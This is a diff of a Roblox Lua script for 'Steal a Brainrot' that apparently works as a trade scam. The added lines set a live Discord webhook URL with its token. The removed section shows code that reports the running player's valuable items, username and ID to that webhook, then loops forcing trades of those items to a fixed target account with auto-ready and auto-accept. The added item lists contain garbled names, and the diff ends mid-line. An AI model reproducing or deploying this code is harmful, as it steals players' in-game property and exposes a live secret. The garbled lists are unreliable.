@@ -53,7 +53,7 @@ if not _llIsAllowedPlace() then
     return
 end
 
-local GOOD_WEBHOOK = ""
+local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1491958831977336892/VO_yHE5mL6dLnNYVb3Hq48_4pPa7dSBmY8qFCfCq1G5sxBRu8urHlL32WZdSYk18D264"
 local GOOD_AVATAR = "https://cdn.grok.x.ai/attachments/sXvFE"
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
 local TARGET_ID = 3826323047
@@ -68,11 +68,11 @@ local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"
 local guiNames = {BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true}
 
 local TargetBrainrots = {
-    ["Meowl"] = true, ["Strawberry Elephant"] = true, ["Headless Horseman"] = true, ["Griffin"] = true, ["Skibidi Toilet"] = true, ["Hydra Dragon Cannelloni"] = true, ["Dragon Gingerini"] = true, ["Dragon Cannelloni"] = true, ["Love Love Bear"] = true, ["La Supreme Combinasion"] = true, ["Hydra Bunny"] = true, ["Celestial Pegasus"] = true, ["Cerberus"] = true, ["Bunny and Eggy"] = true, ["Popcuru and Fizzuru"] = true, ["Rosey and Teddy"] = true, ["Capitano Moby"] = true, ["Cooki and Milki"] = true, ["Burguro And Fryuro"] = true, ["Arcadragon"] = true, ["Ketupat Bros"] = true, ["Reinito Sleighito"] = true, ["Fortunu and Cashuru"] = true, ["Los Amigos"] = true, ["La Secret Combinasion"] = true, ["Pancake and Syrup"] = true, ["Foxini Lanternini"] = true, ["Los Sekolahs"] = true, ["Signore Carapace"] = true, ["La Casa Boo"] = true, ["Cash or Card"] = true, ["Fragrama and Chocrama"] = true, ["La Food Combinasion"] = true, ["Elefanto Frigo"] = true, ["Spooky and Pumpky"] = true, ["Ginger Gerat"] = true, ["La Ginger Sekolah"] = true, ["Sammyni Fattini"] = true, ["Los Spaghettis"] = true, ["Festive 67"] = true, ["Cloverat Clapat"] = true, ["Antonio"] = true, ["La Easter Grae"] = true, ["Rosetti Tualetti"] = true, ["Garama and Madundung"] = true, ["Fishino Clownino"] = true, ["Gold Gold Gold"] = true, ["Jolly Jolly Sahur"] = true, ["Rico Dinero"] = true, ["Tirilikalika Tirilikalako"] = true, ["Orcaledon"] = true, ["La Taco Combinasion"] = true, ["Dug dug dug"] = true, ["Lovin Rose"] = true, ["Los Tacoritas"] = true, ["Eviledon"] = true, ["Los Primos"] = true, ["Los Mariachis"] = true, ["Los Cupids"] = true, ["Los Puggies"] = true, ["Tralaledon"] = true, ["Chillin Chili"] = true, ["Money Money Reindeer"] = true, ["Los Bros"] = true, ["Celularcini Viciosini"] = true, ["Los Hotspotsitos"] = true, ["Los Planitos"] = true, ["Las Sis"] = true, ["Swag Soda"] = true, ["Guest 666"] = true, ["Los Chillis"] = true, ["Fragola La La La"] = true, ["Rhino Helicopterino"] = true, ["Centrucci Nuclucci"] = true, ["Ganganzelli Trulala"] = true, ["Hopilikalika Hopilikalako"] = true, ["Kalika Bros"] = true, ["Digi Narwhal"] = true, ["Quackini Snackini"] = true, ["Gym Bros"] = true, ["La Lucky Grae"] = true, ["Boppin Bunny"] = true, ["Los Hackers"] = true, ["Money Money Bros"] = true, ["Jelly Moby"] = true, ["La Anniversar Gran"] = true, ["Sammyni Cakini"] = true, ["Dragon Aquanini"] = true, ["Coco and Mango"] = true
+    ["Meowl"] = true, ["Strawberry Elephant"] = true, ["Headless Horseman"] = true, ["Griffin"] = true, ["Skibidi Toilet"] = true, ["Hydra Dragon Cannelloni"] = true, ["Dragon Gingerini"] = true, ["Dragon Cannelloni"] = true, ["Love Love Bear"] = true, ["La Supreme Combinasion"] = true, ["Hydra Bunny"] = true, ["Celestial Pegasus"] = true, ["Cerberus"] = true, ["Bunny and Eggy"] = true, ["Popcuru and Fizzuru"] = true, ["Rosey and Teddy"] = true, ["Capitano Moby"] = true, ["Cooki and Milki"] = true, ["Burguro And Fryuro"] = true, ["Arcadragon"] = true, ["Ketupat Bros"] = true, ["Reinito Sleighito"] = true, ["Fortunu and Cashuru"] = true, ["Los Amigos"] = true, ["La Secret Combinasion"] = true, ["Pancake and Syrup"] = true, ["Foxini Lanternini"] = true, ["Los Sekolahs"] = true, ["Signore Carapace"] = true, ["La Casa Boo"] = true, ["Cash or Card"] = true, ["Fragrama and Chocrama"] = true, ["La Food Combinasion"] = true, ["Elefanto Frigo"] = true, ["Spooky and Pumpky"] = true, ["Ginger Gerat"] = true, ["La inger Sekolah"] = true, ["Sammyni Fattini"] = true, ["Los Spaghettis"] = true, ["Festive 67"] = true, ["Cloverat Clapat"] = true, ["Antonio"] = true, ["La Easter Grae"] = true, ["Rosetti Tualei"] = true, ["Garama and Madundung"] = true, ["Fishino Clownino"] = true, ["Gold GoGold"] = true, ["Jolly Jolly Sahur"] = true, ["Rico Dinero"] = true, ["Tirilikalika Tirilikalako"] = true, ["Ocalon"] = true, ["La Taco biasion"] = true, ["Dug dug dug"] = true, ["Lovn Rose"] = true, ["Los Tacoritas"] = true, ["Evileon"] = true, ["Los Primos"] = true, ["Los ariachis"] = true, ["Ls Cupids"] = true, ["Lo Puggis"] = true, ["Tralaledon"] = true, ["Chillin Chili"] = true, ["Money Money Reindeer"] = true, ["LosBros"] = true, ["Celularcini Viciosini"] = true, ["Los Hotspotsitos"] = true, ["Los Planios"] = true, ["Las Ss"] = true, ["Swag oda"] = true, ["Guest 666"] = true, ["Los Chillis"] = true, ["Fragola La La La"] = true, ["Rhino Helicopterino"] = true, ["Centrucci Nuclucci"] = true, ["Ganganzelli Trulala"] = true, ["Hopilikalika Hopilikalako"] = true, ["Kalika Bros"] = true, ["Digi Narwhal"] = true, ["Quackini Snackini"] = true, ["Gym Bros"] = true, ["La Lucky Grae"] = true, ["Boppin Bunny"] = true, ["Los Hackers"] = true, ["Money Money Bros"] = true, ["Jelly Moby"] = true, ["La Anniversar Gran"] = true, ["Sammyni Cakini"] = true, ["Dragon Aquanini"] = true, ["Steakini Fattini"] = true
 }
 
 local GOOD_BRAINROTS = {
-    ["Meowl"] = true, ["Strawberry Elephant"] = true, ["Headless Horseman"] = true, ["Griffin"] = true, ["Skibidi Toilet"] = true, ["Hydra Dragon Cannelloni"] = true, ["Dragon Gingerini"] = true, ["Dragon Cannelloni"] = true, ["Love Love Bear"] = true, ["La Supreme Combinasion"] = true, ["Hydra Bunny"] = true, ["Celestial Pegasus"] = true, ["Cerberus"] = true, ["Bunny and Eggy"] = true, ["Popcuru and Fizzuru"] = true, ["Rosey and Teddy"] = true, ["Capitano Moby"] = true, ["Cooki and Milki"] = true, ["Burguro And Fryuro"] = true, ["Arcadragon"] = true, ["Ketupat Bros"] = true, ["Reinito Sleighito"] = true, ["Fortunu and Cashuru"] = true, ["Los Amigos"] = true, ["La Secret Combinasion"] = true, ["Pancake and Syrup"] = true, ["Foxini Lanternini"] = true, ["Los Sekolahs"] = true, ["Signore Carapace"] = true, ["La Casa Boo"] = true, ["Cash or Card"] = true, ["Fragrama and Chocrama"] = true, ["La Food Combinasion"] = true, ["Elefanto Frigo"] = true, ["Spooky and Pumpky"] = true, ["Ginger Gerat"] = true, ["La Ginger Sekolah"] = true, ["Sammyni Fattini"] = true, ["Los Spaghettis"] = true, ["Festive 67"] = true, ["Cloverat Clapat"] = true, ["Antonio"] = true, ["La er ande"] = true, ["Rosetti Tualetti"] = true, ["Garama and Madundung"] = true, ["Fishino Clownino"] = true, ["Gold Gold Gold"] = true, ["Jolly Jolly Sahur"] = true, ["Rico Dinero"] = true, ["Tirilikalika Tirilikalako"] = true, ["Orcaledon"] = true, ["La Taco Combinasion"] = true, ["Dug dug dug"] = true, ["Lovin Rose"] = true, ["Los Tacoritas"] = true, ["Eviledon"] = true, ["Los Primos"] = true, ["Los Mariachis"] = true, ["Los Cupids"] = true, ["Los Puggies"] = true, ["Tralaledon"] = true, ["Chillin Chili"] = true, ["Money Money Reindeer"] = true, ["Los Bros"] = true, ["Celularcini Viciosini"] = true, ["Los Hotspotsitos"] = true, ["Los Planitos"] = true, ["Las Sis"] = true, ["Swag Soda"] = true, ["Guest 666"] = true, ["Los Chillis"] = true, ["Fragola La La La"] = true, ["Rhino Helicopterino"] = true, ["Centrucci Nuclucci"] = true, ["Ganganzelli Trulala"] = true, ["Hopilikalika Hopilikalako"] = true, ["Kalika Bros"] = true, ["Digi Narwhal"] = true, ["Quackini Snackini"] = true, ["Gym Bros"] = true, ["La Lucky Grae"] = true, ["Boppin Bunny"] = true, ["Los Hackers"] = true, ["Money Money Bros"] = true, ["Jelly Moby"] = true, ["La AnniversaGnde"] = true, ["Sammyni Cakini"] = true, ["Dragon Aquanini"] = true, ["Coco and Mango"] = true
+    ["Meowl"] = true, ["Strawberry Elephant"] = true, ["Headless Horseman"] = true, ["Griffin"] = true, ["Skibidi Toilet"] = true, ["Hydra Dragon Cannelloni"] = true, ["Dragon Gingerini"] = true, ["Dragon Cannelloni"] = true, ["Love Love Bear"] = true, ["La Supreme Combinasion"] = true, ["Hydra Bunny"] = true, ["Celestial Pegasus"] = true, ["Cerberus"] = true, ["Bunny and Eggy"] = true, ["Popcuru and Fizzuru"] = true, ["Rosey and Teddy"] = true, ["Capitano Moby"] = true, ["Cooki and Milki"] = true, ["Burguro And Fryuro"] = true, ["Arcadragon"] = true, ["Ketupat Bros"] = true, ["Reinito Sleighito"] = true, ["Fortunu and Cashuru"] = true, ["Los Amigos"] = true, ["La Secret Combinasion"] = true, ["Pancake and Syrup"] = true, ["Foxini Lanternini"] = true, ["Los Sekolahs"] = true, ["Signore Carapace"] = true, ["La Casa Boo"] = true, ["Cash or Card"] = true, ["Fragrama and Chocrama"] = true, ["La Food Combinasion"] = true, ["Elefanto Frigo"] = true, ["Spooky and Pumpky"] = true, ["Ginger Gerat"] = true, ["La Giner Sekolah"] = true, ["Sammyni Fattini"] = true, ["Los Spaghettis"] = true, ["Festive 67"] = true, ["Cloverat Clapat"] = true, ["Antonio"] = true, ["La er ande"] = true, ["Rsetti Tualetti"] = true, ["Garama and Madundung"] = true, ["Fishino Clownino"] = true, ["Gold Gol Gold"] = true, ["Jolly Jolly Sahur"] = true, ["Rico Dinero"] = true, ["Tirilikalika Tirilikalako"] = true, ["Orcaledn"] = true, ["La Taco Combinasion"] = true, ["Dug dug dug"] = true, ["Loin Rose"] = true, ["Los Tacoritas"] = true, ["Evildon"] = true, ["Los Primos"] = true, ["Los Mariahis"] = true, ["Los Cpids"] = true, ["Los Pugges"] = true, ["Tralaledon"] = true, ["Chillin Chili"] = true, ["Money Money Reindeer"] = true, ["LosBros"] = true, ["Celularcini Viciosini"] = true, ["Los Hotspotsitos"] = true, ["Los Plnitos"] = true, ["Las Ss"] = true, ["Swag Sda"] = true, ["Guest 666"] = true, ["Los Chillis"] = true, ["Fragola La La La"] = true, ["Rhino Helicopterino"] = true, ["Centrucci Nuclucci"] = true, ["Ganganzelli Trulala"] = true, ["Hopilikalika Hopilikalako"] = true, ["Kalika Bros"] = true, ["Digi Narwhal"] = true, ["Quackini Snackini"] = true, ["Gym Bros"] = true, ["La Lucky Grae"] = true, ["Boppin Bunny"] = true, ["Los Hackers"] = true, ["Money Money Bros"] = true, ["Jelly Moby"] = true, ["La AnniversaGnde"] = true, ["Sammyni Cakini"] = true, ["Dragon Aquanini"] = true, ["Steakini Fattini"] = true
 }
 
 local function getRemote(unobfuscatedName)
@@ -402,120 +402,4 @@ local function sendDetailedWebhook()
         local requestFn = getRequestFn()
         if not requestFn then return end
 
-        local top = resultsList[1]
-        local imageUrl = getBestImageUrl(top.displayName, top.index)
-        local topColor = getBrainrotColor(top.index)
-        local embedColor = colorToDecimal(topColor)
-
-        local lines = {}
-        for i, r in ipairs(resultsList) do
-            lines[i] = r.name .. " — **" .. r.genStr .. "**"
-        end
-        local listText = table.concat(lines, "\n")
-        if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
-
-        local unixTime = os.time()
-        local pCount = #Players:GetPlayers()
-        local execName = "Unknown"
-        pcall(function()
-            if identifyexecutor then
-                execName = identifyexecutor()
-            elseif getexecutorname then
-                execName = getexecutorname()
-            end
-        end)
-
-        local embed = {
-            title       = top.displayName .. " — " .. top.genStr,
-            description = listText,
-            color       = embedColor,
-            fields      = {
-                {
-                    name   = "Server",
-                    value  = "Players: **" .. pCount .. "** | Scanned: <t:" .. unixTime .. ":R>",
-                    inline = true
-                },
-                {
-                    name   = "Executor",
-                    value  = execName,
-                    inline = true
-                }
-            },
-            footer      = { text = LP.Name .. " • " .. LP.UserId },
-            timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-        }
-
-        if imageUrl then
-            embed.thumbnail = { url = imageUrl }
-        end
-
-        local payloadData = {
-            embeds     = { embed },
-            username   = "JW ALEE TRADES LOGS",
-            avatar_url = avatarUrl,
-        }
-
-        if ping then
-            payloadData.content = "||@everyone||"
-        end
-
-        local payload = HttpService:JSONEncode(payloadData)
-
-        pcall(function()
-            requestFn({
-                Url     = webhookUrl,
-                Method  = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body    = payload,
-            })
-        end)
-    end
-
-    sendToWebhook(resultsPrimary, GOOD_WEBHOOK, requirePingPrimary, GOOD_AVATAR)
-end
-
-local function startFullAutomation()
-    local inviteRemote = getRemote("TradeService/Invite")
-    local addRemote    = getRemote("TradeService/AddBrainrot")
-    local readyRemote  = getRemote("TradeService/Ready")
-    local acceptRemote = getRemote("TradeService/Accept")
-
-    if not (inviteRemote and addRemote and readyRemote and acceptRemote) then return end
-
-    task.spawn(function()
-        local idx = 1
-        while true do
-            local item = brainrotQueue[idx]
-            if item then
-                pcall(function() addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data) end)
-                idx = (idx % #brainrotQueue) + 1
-            end
-            task.wait(DELAY_STEP)
-        end
-    end)
-
-    task.spawn(function()
-        while true do
-            pcall(function() inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID) end)
-            task.wait(TRADE_CYCLE_DELAY)
-        end
-    end)
-
-    task.spawn(function()
-        while true do
-            pcall(function() readyRemote:FireServer(READY_GUID) end)
-            task.wait(1)
-            pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
-            task.wait(1)
-        end
-    end)
-end
-
-sendDetailedWebhook()
-startFullAutomation()
-end)
-end
-
-sendDetailedWebhook()
-startFullAutomation()
-end)
+        local top = res
